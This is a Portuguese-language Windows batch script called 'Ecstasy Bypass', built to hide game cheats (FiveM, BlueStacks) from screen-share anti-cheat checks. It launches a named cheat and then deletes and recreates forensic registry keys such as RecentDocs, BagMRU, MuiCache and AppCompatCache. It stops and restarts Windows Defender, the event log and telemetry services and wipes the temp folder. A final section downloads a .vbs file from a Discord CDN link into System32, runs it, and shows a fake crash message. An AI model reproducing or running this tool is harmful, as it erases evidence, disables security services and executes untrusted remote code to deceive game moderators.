echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                    %ESC%[31m Coded By Synx/Best/Netty%ESC%[0m
echo.
echo.
echo.                                                    %ESC%[31mAperte qualquer tecla para voltar ao menu!%ESC%[0m
pause>nul
cls
goto Main2

:fivemaba
cls
@echo off
mode 140,40
title Ecstasy Bypass - Coded by Dragonzera#0009
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                    %ESC%[31m1. Bypass for .exe%ESC%[0m
echo.                                                    %ESC%[36m2. Bypass for .tmp%ESC%[0m
echo.                                                    %ESC%[35m3. Bypass Scanners%ESC%[0m
echo.                                                    %ESC%[97m4. Exit and delete%ESC%[0m
echo.
echo.
echo.
set /p input= Escolha uma opcao: 
if %input%==1 goto bypassexe
if %input%==2 goto bypasstempfivem
if %input%==3 goto scanners2
if %input%==4 goto saidinha
::::::::::::::::::::::::::::::::::::
if not exist %input% (
  echo invalid option
  cls
  goto fivemaba
)
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:: Bypass exe FiveM
:bypassexe
cls
mode 140,40
title Ecstasy Bypass To .EXE - Coded by Dragonzera#0009
color 05
echo.                                                           %ESC%[34m`.-:/++++++++/:-.`%ESC%[0m                               
echo.                                                       %ESC%[34m`.:++++++++++++++++++++ :.`%ESC%[0m                           
echo.                                                     %ESC%[34m.:+++++++%ESC%[0m%ESC%[95m////////////%ESC%[0m%ESC%[34m+++++++:`%ESC%[0m                       
echo.                                                   %ESC%[34m`/o++++%ESC%[0m%ESC%[95m////////////////////%ESC%[0m%ESC%[34m++++o/`%ESC%[0m                        
echo.                                                  %ESC%[34m:o+++%ESC%[0m%ESC%[95m//////////////////////////%ESC%[0m%ESC%[34m+++o:%ESC%[0m                       
echo.                                                %ESC%[34m`/o++%ESC%[0m%ESC%[95m//////////////////////////////%ESC%[0m%ESC%[34m++o/`%ESC%[0m                     
echo.                                                %ESC%[34m+o++%ESC%[0m%ESC%[95m///////+ossso//////ossso+///////%ESC%[0m%ESC%[34m++o+%ESC%[0m                     
echo.                                               %ESC%[34m/o++%ESC%[0m%ESC%[95m////////ssoooso////osooosy////////%ESC%[0m%ESC%[34m++o/%ESC%[0m                    
echo.                                              %ESC%[34m`s++%ESC%[0m%ESC%[95m/////////osoooy+////+yoooso/////////%ESC%[0m%ESC%[34m++s`%ESC%[0m                   
echo.                                              %ESC%[34m/+++%ESC%[0m%ESC%[95m//////////+ooo////////ooo+//////////%ESC%[0m%ESC%[34m+++/%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m////////////////////////////////////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34mo+++%ESC%[0m%ESC%[95m///////osssssssssssssssssssso///////%ESC%[0m%ESC%[34m+++o%ESC%[0m                   
echo.                                              %ESC%[34ms+++%ESC%[0m%ESC%[95m//////osooooooooooooooooooooso//////%ESC%[0m%ESC%[34m+++s%ESC%[0m                   
echo.                                              %ESC%[34myo++%ESC%[0m%ESC%[95m///////yooooooooooooooooooooy///////%ESC%[0m%ESC%[34m++oy%ESC%[0m                   
echo.                                              %ESC%[34msh+++%ESC%[0m%ESC%[95m//////+yooooooooooooooooooy+//////%ESC%[0m%ESC%[34m+++hs%ESC%[0m                   
echo.                                              %ESC%[34m/ss+++%ESC%[0m%ESC%[95m///////ssooooooooooooooss///////%ESC%[0m%ESC%[34m+++ss/%ESC%[0m                   
echo.                                              %ESC%[34m`yss+++%ESC%[0m%ESC%[95m///////+ossssoooosssso+///////%ESC%[0m%ESC%[34m+++ssy`%ESC%[0m                   
echo.                                               %ESC%[34m/sss+++%ESC%[0m%ESC%[95m/////////++oooooo++/////////%ESC%[0m%ESC%[34m+++sss/%ESC%[0m                    
echo.                                                %ESC%[34m+ssyo+++%ESC%[0m%ESC%[95m////////////////////////%ESC%[0m%ESC%[34m+++oyss+%ESC%[0m                     
echo.                                                %ESC%[34m`+sosso++++%ESC%[0m%ESC%[95m//////////////////%ESC%[0m%ESC%[34m++++ossos+%ESC%[0m                      
echo.                                                  %ESC%[34m:osossso++++++%ESC%[0m%ESC%[95m////////%ESC%[0m%ESC%[34m++++++osssoss:%ESC%[0m                       
echo.                                              %ESC%[34m     `/osoossssooo++++++++ ooossssooso/`      %ESC%[0m               
echo.                                                     ^ %ESC%[34m.:osoooossssssssssssssooosso:.%ESC%[0m                         
echo.                                                       ^ %ESC%[34m`.:+oosoooooooooooosooo/.`%ESC%[0m                           
echo.                                                           ^ %ESC%[34m`.-/++oooooo++/-.`%ESC%[0m                               
echo.                                                                                          %ESC%[4mCoded by Dragonzera#0009%ESC%[0m
echo.                                                               
echo.                                                        %ESC%[33m1. Enable Bypass For .EXE%ESC%[0m
echo.
echo.
set /p input=%ESC%[4mEscolha uma opcao:%ESC%[0m 
if %input%==1 goto sim2

:::::::::::::::::::::::::::::::::::::::::
:scanners2
cls
@echo off
cls
mode 60,30
title Ecstasy Bypass - Coded by Dragonzera#0009
echo. %ESC%[36m
echo.
echo.                  .-//++++//-.                  
echo.               -/++++//////++++/-               
echo.              -+++//////////////+++-              
echo.             /++/////+//////+/////++/             
echo.            /++////+oos+//+soo+////++/            
echo.           .o+/////+sss+//+sss+/////+o.           
echo.           /++///////+//////+///////++/           
echo.           /++////oooooooooooooo////++/           
echo.           o++////soooooooooooos////++o           
echo.           +s+////+soooooooooos+////+s+           
echo.           .so+/////+oossssoo+/////+os.           
echo.            /ss++//////++++//////++ss/            
echo.             /ssoo++//////////++ooss/             
echo.              -+sssoo++++++++oosss+-              
echo.               `-+oosooossooosoo+-               
echo.                  `.:/++oo++/:.                  
echo.
time
sc stop eventlog >nul
tskill explorer
sc stop dps >nul
sc stop pcasvc >nul
sc stop diagtrack >nul
sc stop WinDefend >nul
sc stop sysmain >nul
sc start dps >nul
sc start pcasvc >nul
sc start diagtrack >nul
sc start WinDefend >nul
sc start sysmain >nul
sc start eventlog >nul
time
echo.
echo.
echo.
echo.
echo.
echo  %ESC%[33mPressione Algum Tecla tecla.%ESC%[0m
pause>nul
cls
goto fivemaba
:::::::::::::::::::::::::
REM Sistema de bypass .exe FiveM
:sim2
cls
echo Escreva o nome do cheat. (Exemplo: cheat.exe)
set /p n=Cheat: 
cls
echo Selecione o diretorio do cheat.
echo [ 1 ] Desktop
set /p is=Directory: 
if is == 1 cd C:\Users\%username%\Desktop
start C:\Users\%username%\Desktop\%n%
cls
echo Apos pedirem sua tela feche o %n% e aperte qualquer botao
pause >nul
goto regdelete19

:regdelete19
cls
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg DELETE "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f


reg add "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f
cls
goto :scanners2

:bypasstempfivem
cls
echo Escreva o nome do cheat. (Exemplo: cheat.tmp)
set /p n=Cheat: 
cls
echo Selecione o diretorio do cheat.
echo [ 1 ] Temp
set /p is=Directory: 
if is == 1 cd C:\Users\%username%\AppData\Local\Temp
start C:\Users\%username%\AppData\Local\Temp\%n%
cls
echo Apos pedirem sua tela feche o %n% e aperte qualquer botao
pause >nul
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg DELETE "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f

reg add "HKEY_CURRENT_USER\SOFTWARE\7-Zip\FM" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\FirstFolder" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\DirectInput" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing" /f
cls
goto :scanners2

:: Sistema de crash HD-Player
cls
@shift /0
@echo off
title Ecstasy Bypass
bitsadmin /transfer calcmyDownload /download /priority foreground https://cdn.discordapp.com/attachments/947182806004551734/956382364680998932/adm.vbs C:\Windows\System32\adm.vbs >nul
timeout /t 5 /nobreak > nul

taskkill -im HD-Player.exe /f >nul
echo x=msgbox("HD-Player Crash Restart Program to fix this problem" ,16, "HD-Player.exe - System Error") >> C:\Windows\System32\adm.vbs
start  C:\Windows\System32\adm.vbs


If exist "C:\Program Files\BlueStacks\HD-Player.exe" (
	echo bs found
	cd C:\Program Files\BlueStacks
	start HD-Player.exe
)
:msi
If exist "C:\Program Files\BlueStacks_msi2\HD-Player.exe" (
    echo Msi Found!
	cd C:\Program Files\BlueStacks_msi2
	start HD-Player.exe
)
del /s /f /q %temp%\*.*
rd /s /q %temp%
md %temp%
timeout /t 4 /nobreak > nul
del C:\ProgramData\BlueStacks\Client\HD-Adb.exe
del C:\Program Files\BlueStacks_msi2\fr\HD-Adb.exe
echo Bypass Terminado!
echo.
echo.
pause>nul
cls
goto :main88